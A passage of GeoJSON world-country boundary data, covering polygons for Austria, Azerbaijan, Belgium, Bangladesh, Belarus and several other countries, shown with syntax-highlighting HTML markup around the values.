class="hljs-selector-attr">[119.805225,-19.976506]</span>,<span class="hljs-selector-attr">[120.85622,-19.683708]</span>,<span class="hljs-selector-attr">[121.399856,-19.239756]</span>,<span class="hljs-selector-attr">[121.655138,-18.705318]</span>,<span class="hljs-selector-attr">[122.241665,-18.197649]</span>,<span class="hljs-selector-attr">[122.286624,-17.798603]</span>,<span class="hljs-selector-attr">[122.312772,-17.254967]</span>,<span class="hljs-selector-attr">[123.012574,-16.4052]</span>,<span class="hljs-selector-attr">[123.433789,-17.268558]</span>,<span class="hljs-selector-attr">[123.859345,-17.069035]</span>,<span class="hljs-selector-attr">[123.503242,-16.596506]</span>,<span class="hljs-selector-attr">[123.817073,-16.111316]</span>,<span class="hljs-selector-attr">[124.258287,-16.327944]</span>,<span class="hljs-selector-attr">[124.379726,-15.56706]</span>,<span class="hljs-selector-attr">[124.926153,-15.0751]</span>,<span class="hljs-selector-attr">[125.167275,-14.680396]</span>,<span class="hljs-selector-attr">[125.670087,-14.51007]</span>,<span class="hljs-selector-attr">[125.685796,-14.230656]</span>,<span class="hljs-selector-attr">[126.125149,-14.347341]</span>,<span class="hljs-selector-attr">[126.142823,-14.095987]</span>,<span class="hljs-selector-attr">[126.582589,-13.952791]</span>,<span class="hljs-selector-attr">[127.065867,-13.817968]</span>,<span class="hljs-selector-attr">[127.804633,-14.276906]</span>,<span class="hljs-selector-attr">[128.35969,-14.86917]</span>,<span class="hljs-selector-attr">[128.985543,-14.875991]</span>,<span class="hljs-selector-attr">[129.621473,-14.969784]</span>,<span class="hljs-selector-attr">[129.4096,-14.42067]</span>,<span class="hljs-selector-attr">[129.888641,-13.618703]</span>,<span class="hljs-selector-attr">[130.339466,-13.357376]</span>,<span class="hljs-selector-attr">[130.183506,-13.10752]</span>,<span class="hljs-selector-attr">[130.617795,-12.536392]</span>,<span class="hljs-selector-attr">[131.223495,-12.183649]</span>,<span class="hljs-selector-attr">[131.735091,-12.302453]</span>,<span class="hljs-selector-attr">[132.575298,-12.114041]</span>,<span class="hljs-selector-attr">[132.557212,-11.603012]</span>,<span class="hljs-selector-attr">[131.824698,-11.273782]</span>,<span class="hljs-selector-attr">[132.357224,-11.128519]</span>,<span class="hljs-selector-attr">[133.019561,-11.376411]</span>,<span class="hljs-selector-attr">[133.550846,-11.786515]</span>,<span class="hljs-selector-attr">[134.393068,-12.042365]</span>,<span class="hljs-selector-attr">[134.678632,-11.941183]</span>,<span class="hljs-selector-attr">[135.298491,-12.248606]</span>,<span class="hljs-selector-attr">[135.882693,-11.962267]</span>,<span class="hljs-selector-attr">[136.258381,-12.049342]</span>,<span class="hljs-selector-attr">[136.492475,-11.857209]</span>,<span class="hljs-selector-attr">[136.95162,-12.351959]</span>,<span class="hljs-selector-attr">[136.685125,-12.887223]</span>,<span class="hljs-selector-attr">[136.305407,-13.29123]</span>,<span class="hljs-selector-attr">[135.961758,-13.324509]</span>,<span class="hljs-selector-attr">[136.077617,-13.724278]</span>,<span class="hljs-selector-attr">[135.783836,-14.223989]</span>,<span class="hljs-selector-attr">[135.428664,-14.715432]</span>,<span class="hljs-selector-attr">[135.500184,-14.997741]</span>,<span class="hljs-selector-attr">[136.295175,-15.550265]</span>,<span class="hljs-selector-attr">[137.06536,-15.870762]</span>,<span class="hljs-selector-attr">[137.580471,-16.215082]</span>,<span class="hljs-selector-attr">[138.303217,-16.807604]</span>,<span class="hljs-selector-attr">[138.585164,-16.806622]</span>,<span class="hljs-selector-attr">[139.108543,-17.062679]</span>,<span class="hljs-selector-attr">[139.260575,-17.371601]</span>,<span class="hljs-selector-attr">[140.215245,-17.710805]</span>,<span class="hljs-selector-attr">[140.875463,-17.369069]</span>,<span class="hljs-selector-attr">[141.07111,-16.832047]</span>,<span class="hljs-selector-attr">[141.274095,-16.38887]</span>,<span class="hljs-selector-attr">[141.398222,-15.840532]</span>,<span class="hljs-selector-attr">[141.702183,-15.044921]</span>,<span class="hljs-selector-attr">[141.56338,-14.561333]</span>,<span class="hljs-selector-attr">[141.63552,-14.270395]</span>,<span class="hljs-selector-attr">[141.519869,-13.698078]</span>,<span class="hljs-selector-attr">[141.65092,-12.944688]</span>,<span class="hljs-selector-attr">[141.842691,-12.741548]</span>,<span class="hljs-selector-attr">[141.68699,-12.407614]</span>,<span class="hljs-selector-attr">[141.928629,-11.877466]</span>,<span class="hljs-selector-attr">[142.118488,-11.328042]</span>,<span class="hljs-selector-attr">[142.143706,-11.042737]</span>,<span class="hljs-selector-attr">[142.51526,-10.668186]</span>,<span class="hljs-selector-attr">[142.79731,-11.157355]</span>,<span class="hljs-selector-attr">[142.866763,-11.784707]</span>,<span class="hljs-selector-attr">[143.115947,-11.90563]</span>,<span class="hljs-selector-attr">[143.158632,-12.325656]</span>,<span class="hljs-selector-attr">[143.522124,-12.834358]</span>,<span class="hljs-selector-attr">[143.597158,-13.400422]</span>,<span class="hljs-selector-attr">[143.561811,-13.763656]</span>]]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">AUT</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Austria</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[16.979667,48.123497]</span>,<span class="hljs-selector-attr">[16.903754,47.714866]</span>,<span class="hljs-selector-attr">[16.340584,47.712902]</span>,<span class="hljs-selector-attr">[16.534268,47.496171]</span>,<span class="hljs-selector-attr">[16.202298,46.852386]</span>,<span class="hljs-selector-attr">[16.011664,46.683611]</span>,<span class="hljs-selector-attr">[15.137092,46.658703]</span>,<span class="hljs-selector-attr">[14.632472,46.431817]</span>,<span class="hljs-selector-attr">[13.806475,46.509306]</span>,<span class="hljs-selector-attr">[12.376485,46.767559]</span>,<span class="hljs-selector-attr">[12.153088,47.115393]</span>,<span class="hljs-selector-attr">[11.164828,46.941579]</span>,<span class="hljs-selector-attr">[11.048556,46.751359]</span>,<span class="hljs-selector-attr">[10.442701,46.893546]</span>,<span class="hljs-selector-attr">[9.932448,46.920728]</span>,<span class="hljs-selector-attr">[9.47997,47.10281]</span>,<span class="hljs-selector-attr">[9.632932,47.347601]</span>,<span class="hljs-selector-attr">[9.594226,47.525058]</span>,<span class="hljs-selector-attr">[9.896068,47.580197]</span>,<span class="hljs-selector-attr">[10.402084,47.302488]</span>,<span class="hljs-selector-attr">[10.544504,47.566399]</span>,<span class="hljs-selector-attr">[11.426414,47.523766]</span>,<span class="hljs-selector-attr">[12.141357,47.703083]</span>,<span class="hljs-selector-attr">[12.62076,47.672388]</span>,<span class="hljs-selector-attr">[12.932627,47.467646]</span>,<span class="hljs-selector-attr">[13.025851,47.637584]</span>,<span class="hljs-selector-attr">[12.884103,48.289146]</span>,<span class="hljs-selector-attr">[13.243357,48.416115]</span>,<span class="hljs-selector-attr">[13.595946,48.877172]</span>,<span class="hljs-selector-attr">[14.338898,48.555305]</span>,<span class="hljs-selector-attr">[14.901447,48.964402]</span>,<span class="hljs-selector-attr">[15.253416,49.039074]</span>,<span class="hljs-selector-attr">[16.029647,48.733899]</span>,<span class="hljs-selector-attr">[16.499283,48.785808]</span>,<span class="hljs-selector-attr">[16.960288,48.596982]</span>,<span class="hljs-selector-attr">[16.879983,48.470013]</span>,<span class="hljs-selector-attr">[16.979667,48.123497]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">AZE</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Azerbaijan</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">MultiPolygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[[45.001987,39.740004]</span>,<span class="hljs-selector-attr">[45.298145,39.471751]</span>,<span class="hljs-selector-attr">[45.739978,39.473999]</span>,<span class="hljs-selector-attr">[45.735379,39.319719]</span>,<span class="hljs-selector-attr">[46.143623,38.741201]</span>,<span class="hljs-selector-attr">[45.457722,38.874139]</span>,<span class="hljs-selector-attr">[44.952688,39.335765]</span>,<span class="hljs-selector-attr">[44.79399,39.713003]</span>,<span class="hljs-selector-attr">[45.001987,39.740004]</span>]],<span class="hljs-selector-attr">[[[47.373315,41.219732]</span>,<span class="hljs-selector-attr">[47.815666,41.151416]</span>,<span class="hljs-selector-attr">[47.987283,41.405819]</span>,<span class="hljs-selector-attr">[48.584353,41.80887]</span>,<span class="hljs-selector-attr">[49.110264,41.282287]</span>,<span class="hljs-selector-attr">[49.618915,40.572924]</span>,<span class="hljs-selector-attr">[50.08483,40.526157]</span>,<span class="hljs-selector-attr">[50.392821,40.256561]</span>,<span class="hljs-selector-attr">[49.569202,40.176101]</span>,<span class="hljs-selector-attr">[49.395259,39.399482]</span>,<span class="hljs-selector-attr">[49.223228,39.049219]</span>,<span class="hljs-selector-attr">[48.856532,38.815486]</span>,<span class="hljs-selector-attr">[48.883249,38.320245]</span>,<span class="hljs-selector-attr">[48.634375,38.270378]</span>,<span class="hljs-selector-attr">[48.010744,38.794015]</span>,<span class="hljs-selector-attr">[48.355529,39.288765]</span>,<span class="hljs-selector-attr">[48.060095,39.582235]</span>,<span class="hljs-selector-attr">[47.685079,39.508364]</span>,<span class="hljs-selector-attr">[46.50572,38.770605]</span>,<span class="hljs-selector-attr">[46.483499,39.464155]</span>,<span class="hljs-selector-attr">[46.034534,39.628021]</span>,<span class="hljs-selector-attr">[45.610012,39.899994]</span>,<span class="hljs-selector-attr">[45.891907,40.218476]</span>,<span class="hljs-selector-attr">[45.359175,40.561504]</span>,<span class="hljs-selector-attr">[45.560351,40.81229]</span>,<span class="hljs-selector-attr">[45.179496,40.985354]</span>,<span class="hljs-selector-attr">[44.97248,41.248129]</span>,<span class="hljs-selector-attr">[45.217426,41.411452]</span>,<span class="hljs-selector-attr">[45.962601,41.123873]</span>,<span class="hljs-selector-attr">[46.501637,41.064445]</span>,<span class="hljs-selector-attr">[46.637908,41.181673]</span>,<span class="hljs-selector-attr">[46.145432,41.722802]</span>,<span class="hljs-selector-attr">[46.404951,41.860675]</span>,<span class="hljs-selector-attr">[46.686071,41.827137]</span>,<span class="hljs-selector-attr">[47.373315,41.219732]</span>]]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BDI</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Burundi</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[29.339998,-4.499983]</span>,<span class="hljs-selector-attr">[29.276384,-3.293907]</span>,<span class="hljs-selector-attr">[29.024926,-2.839258]</span>,<span class="hljs-selector-attr">[29.632176,-2.917858]</span>,<span class="hljs-selector-attr">[29.938359,-2.348487]</span>,<span class="hljs-selector-attr">[30.469696,-2.413858]</span>,<span class="hljs-selector-attr">[30.527677,-2.807632]</span>,<span class="hljs-selector-attr">[30.743013,-3.034285]</span>,<span class="hljs-selector-attr">[30.752263,-3.35933]</span>,<span class="hljs-selector-attr">[30.50556,-3.568567]</span>,<span class="hljs-selector-attr">[30.116333,-4.090138]</span>,<span class="hljs-selector-attr">[29.753512,-4.452389]</span>,<span class="hljs-selector-attr">[29.339998,-4.499983]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BEL</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Belgium</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[3.314971,51.345781]</span>,<span class="hljs-selector-attr">[4.047071,51.267259]</span>,<span class="hljs-selector-attr">[4.973991,51.475024]</span>,<span class="hljs-selector-attr">[5.606976,51.037298]</span>,<span class="hljs-selector-attr">[6.156658,50.803721]</span>,<span class="hljs-selector-attr">[6.043073,50.128052]</span>,<span class="hljs-selector-attr">[5.782417,50.090328]</span>,<span class="hljs-selector-attr">[5.674052,49.529484]</span>,<span class="hljs-selector-attr">[4.799222,49.985373]</span>,<span class="hljs-selector-attr">[4.286023,49.907497]</span>,<span class="hljs-selector-attr">[3.588184,50.378992]</span>,<span class="hljs-selector-attr">[3.123252,50.780363]</span>,<span class="hljs-selector-attr">[2.658422,50.796848]</span>,<span class="hljs-selector-attr">[2.513573,51.148506]</span>,<span class="hljs-selector-attr">[3.314971,51.345781]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BEN</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Benin</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[2.691702,6.258817]</span>,<span class="hljs-selector-attr">[1.865241,6.142158]</span>,<span class="hljs-selector-attr">[1.618951,6.832038]</span>,<span class="hljs-selector-attr">[1.664478,9.12859]</span>,<span class="hljs-selector-attr">[1.463043,9.334624]</span>,<span class="hljs-selector-attr">[1.425061,9.825395]</span>,<span class="hljs-selector-attr">[1.077795,10.175607]</span>,<span class="hljs-selector-attr">[0.772336,10.470808]</span>,<span class="hljs-selector-attr">[0.899563,10.997339]</span>,<span class="hljs-selector-attr">[1.24347,11.110511]</span>,<span class="hljs-selector-attr">[1.447178,11.547719]</span>,<span class="hljs-selector-attr">[1.935986,11.64115]</span>,<span class="hljs-selector-attr">[2.154474,11.94015]</span>,<span class="hljs-selector-attr">[2.490164,12.233052]</span>,<span class="hljs-selector-attr">[2.848643,12.235636]</span>,<span class="hljs-selector-attr">[3.61118,11.660167]</span>,<span class="hljs-selector-attr">[3.572216,11.327939]</span>,<span class="hljs-selector-attr">[3.797112,10.734746]</span>,<span class="hljs-selector-attr">[3.60007,10.332186]</span>,<span class="hljs-selector-attr">[3.705438,10.06321]</span>,<span class="hljs-selector-attr">[3.220352,9.444153]</span>,<span class="hljs-selector-attr">[2.912308,9.137608]</span>,<span class="hljs-selector-attr">[2.723793,8.506845]</span>,<span class="hljs-selector-attr">[2.749063,7.870734]</span>,<span class="hljs-selector-attr">[2.691702,6.258817]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BFA</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Burkina</span> <span class="hljs-selector-tag">Faso</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[-2.827496,9.642461]</span>,<span class="hljs-selector-attr">[-3.511899,9.900326]</span>,<span class="hljs-selector-attr">[-3.980449,9.862344]</span>,<span class="hljs-selector-attr">[-4.330247,9.610835]</span>,<span class="hljs-selector-attr">[-4.779884,9.821985]</span>,<span class="hljs-selector-attr">[-4.954653,10.152714]</span>,<span class="hljs-selector-attr">[-5.404342,10.370737]</span>,<span class="hljs-selector-attr">[-5.470565,10.95127]</span>,<span class="hljs-selector-attr">[-5.197843,11.375146]</span>,<span class="hljs-selector-attr">[-5.220942,11.713859]</span>,<span class="hljs-selector-attr">[-4.427166,12.542646]</span>,<span class="hljs-selector-attr">[-4.280405,13.228444]</span>,<span class="hljs-selector-attr">[-4.006391,13.472485]</span>,<span class="hljs-selector-attr">[-3.522803,13.337662]</span>,<span class="hljs-selector-attr">[-3.103707,13.541267]</span>,<span class="hljs-selector-attr">[-2.967694,13.79815]</span>,<span class="hljs-selector-attr">[-2.191825,14.246418]</span>,<span class="hljs-selector-attr">[-2.001035,14.559008]</span>,<span class="hljs-selector-attr">[-1.066363,14.973815]</span>,<span class="hljs-selector-attr">[-0.515854,15.116158]</span>,<span class="hljs-selector-attr">[-0.266257,14.924309]</span>,<span class="hljs-selector-attr">[0.374892,14.928908]</span>,<span class="hljs-selector-attr">[0.295646,14.444235]</span>,<span class="hljs-selector-attr">[0.429928,13.988733]</span>,<span class="hljs-selector-attr">[0.993046,13.33575]</span>,<span class="hljs-selector-attr">[1.024103,12.851826]</span>,<span class="hljs-selector-attr">[2.177108,12.625018]</span>,<span class="hljs-selector-attr">[2.154474,11.94015]</span>,<span class="hljs-selector-attr">[1.935986,11.64115]</span>,<span class="hljs-selector-attr">[1.447178,11.547719]</span>,<span class="hljs-selector-attr">[1.24347,11.110511]</span>,<span class="hljs-selector-attr">[0.899563,10.997339]</span>,<span class="hljs-selector-attr">[0.023803,11.018682]</span>,<span class="hljs-selector-attr">[-0.438702,11.098341]</span>,<span class="hljs-selector-attr">[-0.761576,10.93693]</span>,<span class="hljs-selector-attr">[-1.203358,11.009819]</span>,<span class="hljs-selector-attr">[-2.940409,10.96269]</span>,<span class="hljs-selector-attr">[-2.963896,10.395335]</span>,<span class="hljs-selector-attr">[-2.827496,9.642461]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BGD</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Bangladesh</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[92.672721,22.041239]</span>,<span class="hljs-selector-attr">[92.652257,21.324048]</span>,<span class="hljs-selector-attr">[92.303234,21.475485]</span>,<span class="hljs-selector-attr">[92.368554,20.670883]</span>,<span class="hljs-selector-attr">[92.082886,21.192195]</span>,<span class="hljs-selector-attr">[92.025215,21.70157]</span>,<span class="hljs-selector-attr">[91.834891,22.182936]</span>,<span class="hljs-selector-attr">[91.417087,22.765019]</span>,<span class="hljs-selector-attr">[90.496006,22.805017]</span>,<span class="hljs-selector-attr">[90.586957,22.392794]</span>,<span class="hljs-selector-attr">[90.272971,21.836368]</span>,<span class="hljs-selector-attr">[89.847467,22.039146]</span>,<span class="hljs-selector-attr">[89.70205,21.857116]</span>,<span class="hljs-selector-attr">[89.418863,21.966179]</span>,<span class="hljs-selector-attr">[89.031961,22.055708]</span>,<span class="hljs-selector-attr">[88.876312,22.879146]</span>,<span class="hljs-selector-attr">[88.52977,23.631142]</span>,<span class="hljs-selector-attr">[88.69994,24.233715]</span>,<span class="hljs-selector-attr">[88.084422,24.501657]</span>,<span class="hljs-selector-attr">[88.306373,24.866079]</span>,<span class="hljs-selector-attr">[88.931554,25.238692]</span>,<span class="hljs-selector-attr">[88.209789,25.768066]</span>,<span class="hljs-selector-attr">[88.563049,26.446526]</span>,<span class="hljs-selector-attr">[89.355094,26.014407]</span>,<span class="hljs-selector-attr">[89.832481,25.965082]</span>,<span class="hljs-selector-attr">[89.920693,25.26975]</span>,<span class="hljs-selector-attr">[90.872211,25.132601]</span>,<span class="hljs-selector-attr">[91.799596,25.147432]</span>,<span class="hljs-selector-attr">[92.376202,24.976693]</span>,<span class="hljs-selector-attr">[91.915093,24.130414]</span>,<span class="hljs-selector-attr">[91.46773,24.072639]</span>,<span class="hljs-selector-attr">[91.158963,23.503527]</span>,<span class="hljs-selector-attr">[91.706475,22.985264]</span>,<span class="hljs-selector-attr">[91.869928,23.624346]</span>,<span class="hljs-selector-attr">[92.146035,23.627499]</span>,<span class="hljs-selector-attr">[92.672721,22.041239]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BGR</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Bulgaria</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[22.65715,44.234923]</span>,<span class="hljs-selector-attr">[22.944832,43.823785]</span>,<span class="hljs-selector-attr">[23.332302,43.897011]</span>,<span class="hljs-selector-attr">[24.100679,43.741051]</span>,<span class="hljs-selector-attr">[25.569272,43.688445]</span>,<span class="hljs-selector-attr">[26.065159,43.943494]</span>,<span class="hljs-selector-attr">[27.2424,44.175986]</span>,<span class="hljs-selector-attr">[27.970107,43.812468]</span>,<span class="hljs-selector-attr">[28.558081,43.707462]</span>,<span class="hljs-selector-attr">[28.039095,43.293172]</span>,<span class="hljs-selector-attr">[27.673898,42.577892]</span>,<span class="hljs-selector-attr">[27.99672,42.007359]</span>,<span class="hljs-selector-attr">[27.135739,42.141485]</span>,<span class="hljs-selector-attr">[26.117042,41.826905]</span>,<span class="hljs-selector-attr">[26.106138,41.328899]</span>,<span class="hljs-selector-attr">[25.197201,41.234486]</span>,<span class="hljs-selector-attr">[24.492645,41.583896]</span>,<span class="hljs-selector-attr">[23.692074,41.309081]</span>,<span class="hljs-selector-attr">[22.952377,41.337994]</span>,<span class="hljs-selector-attr">[22.881374,41.999297]</span>,<span class="hljs-selector-attr">[22.380526,42.32026]</span>,<span class="hljs-selector-attr">[22.545012,42.461362]</span>,<span class="hljs-selector-attr">[22.436595,42.580321]</span>,<span class="hljs-selector-attr">[22.604801,42.898519]</span>,<span class="hljs-selector-attr">[22.986019,43.211161]</span>,<span class="hljs-selector-attr">[22.500157,43.642814]</span>,<span class="hljs-selector-attr">[22.410446,44.008063]</span>,<span class="hljs-selector-attr">[22.65715,44.234923]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BHS</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">The</span> <span class="hljs-selector-tag">Bahamas</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">MultiPolygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[[-77.53466,23.75975]</span>,<span class="hljs-selector-attr">[-77.78,23.71]</span>,<span class="hljs-selector-attr">[-78.03405,24.28615]</span>,<span class="hljs-selector-attr">[-78.40848,24.57564]</span>,<span class="hljs-selector-attr">[-78.19087,25.2103]</span>,<span class="hljs-selector-attr">[-77.89,25.17]</span>,<span class="hljs-selector-attr">[-77.54,24.34]</span>,<span class="hljs-selector-attr">[-77.53466,23.75975]</span>]],<span class="hljs-selector-attr">[[[-77.82,26.58]</span>,<span class="hljs-selector-attr">[-78.91,26.42]</span>,<span class="hljs-selector-attr">[-78.98,26.79]</span>,<span class="hljs-selector-attr">[-78.51,26.87]</span>,<span class="hljs-selector-attr">[-77.85,26.84]</span>,<span class="hljs-selector-attr">[-77.82,26.58]</span>]],<span class="hljs-selector-attr">[[[-77,26.59]</span>,<span class="hljs-selector-attr">[-77.17255,25.87918]</span>,<span class="hljs-selector-attr">[-77.35641,26.00735]</span>,<span class="hljs-selector-attr">[-77.34,26.53]</span>,<span class="hljs-selector-attr">[-77.78802,26.92516]</span>,<span class="hljs-selector-attr">[-77.79,27.04]</span>,<span class="hljs-selector-attr">[-77,26.59]</span>]]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BIH</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Bosnia</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">Herzegovina</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[19.005486,44.860234]</span>,<span class="hljs-selector-attr">[19.36803,44.863]</span>,<span class="hljs-selector-attr">[19.11761,44.42307]</span>,<span class="hljs-selector-attr">[19.59976,44.03847]</span>,<span class="hljs-selector-attr">[19.454,43.5681]</span>,<span class="hljs-selector-attr">[19.21852,43.52384]</span>,<span class="hljs-selector-attr">[19.03165,43.43253]</span>,<span class="hljs-selector-attr">[18.70648,43.20011]</span>,<span class="hljs-selector-attr">[18.56,42.65]</span>,<span class="hljs-selector-attr">[17.674922,43.028563]</span>,<span class="hljs-selector-attr">[17.297373,43.446341]</span>,<span class="hljs-selector-attr">[16.916156,43.667722]</span>,<span class="hljs-selector-attr">[16.456443,44.04124]</span>,<span class="hljs-selector-attr">[16.23966,44.351143]</span>,<span class="hljs-selector-attr">[15.750026,44.818712]</span>,<span class="hljs-selector-attr">[15.959367,45.233777]</span>,<span class="hljs-selector-attr">[16.318157,45.004127]</span>,<span class="hljs-selector-attr">[16.534939,45.211608]</span>,<span class="hljs-selector-attr">[17.002146,45.233777]</span>,<span class="hljs-selector-attr">[17.861783,45.06774]</span>,<span class="hljs-selector-attr">[18.553214,45.08159]</span>,<span class="hljs-selector-attr">[19.005486,44.860234]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">BLR</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Belarus</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[23.484128,53.912498]</span>,<span class="hljs-selector-attr">[24.450684,53.905702]</span>,<span class="hljs-selector-attr">[25.536354,54.282423]</span>,<span class="hljs-selector-attr">[25.768433,54.846963]</span>,<span class="hljs-selector-attr">[26.588279,55.167176]</span>,<span class="hljs-selector-attr">[26.494331,55.615107]</span>,<span class="hljs-selector-attr">[27.10246,55.783314]</span>,<span class="hljs-selector-attr">[28.176709,56.16913]</span>,<span class="hljs-selector-attr">[29.229513,55.918344]</span>,<span class="hljs-selector-attr">[29.371572,55.670091]</span>,<span class="hljs-selector-attr">[29.896294,55.789463]</span>,<span class="hljs-selector-attr">[30.873909,55.550976]</span>,<span class="hljs-selector-attr">[30.971836,55.081548]</span>,<span class="hljs-selector-attr">[30.757534,54.811771]</span>,<span class="hljs-selector-attr">[31.384472,54.157056]</span>,<span class="hljs-selector-attr">[31.791424,53.974639]</span>,<span class="hljs-selector-attr">[31.731273,53.794029]</span>,<span class="hljs-selector-attr">[32.405599,53.618045]</span>,<span class="hljs-selector-attr">[32.693643,53.351421]</span>,<span class="hljs-selector-attr">[32.304519,53.132726]</span>,<span class="hljs-selector-attr">[31.497644,53.167427]</span>,<span class="hljs-selector-attr">[31.305201,53.073996]</span>,<span class="hljs-selector-attr">[31.540018,52.742052]</span>,<span class="hljs-selector-attr">[31.785998,52.101678]</span>,<span class="hljs-selector-attr">[30.927549,52.042353]</span>,<span class="hljs-selector-attr">[30.619454,51.822806]</span>,<span class="hljs-selector-attr">[30.555117,51.319503]</span>,<span class="hljs-selector-attr">[30.157364,51.416138]</span>,<span class="hljs-selector-attr">[29.254938,51.368234]</span>,<span class="hljs-selector-attr">[28.992835,51.602044]</span>,<span class="hljs-selector-attr">[28.617613,51.427714]</span>,<span class="hljs-selector-attr">[28.241615,51.572227]</span>,<span class="hljs-selector-attr">[27.454066,51.592303]</span>,<span class="hljs-selector-attr">[26.337959,51.832289]</span>,<span class="hljs-selector-attr">[25.327788,51.910656]</span>,<span class="hljs-selector-attr">[24.553106,51.888461]</span>,<span class="hljs-selector-attr">[24.005078,51.617444]</span>,<span class="hljs-selector-attr">[23.527071,51.578454]</span>,<span class="hljs-selector-attr">[23.508002,52.023647]</span>,<span class="hljs-selector-attr">[23.199494,52.486977]</span>,<span class="hljs-selector-attr">[23.799199,52.691099]</span>,<span class="hljs-selector-attr">[23.804935,53.089731]</span>,<span class="hljs-selector-attr">[23.527536,53.470122]</span>,<span class="hljs-selector-attr">[23.484128,53.912498]</span>]]}},
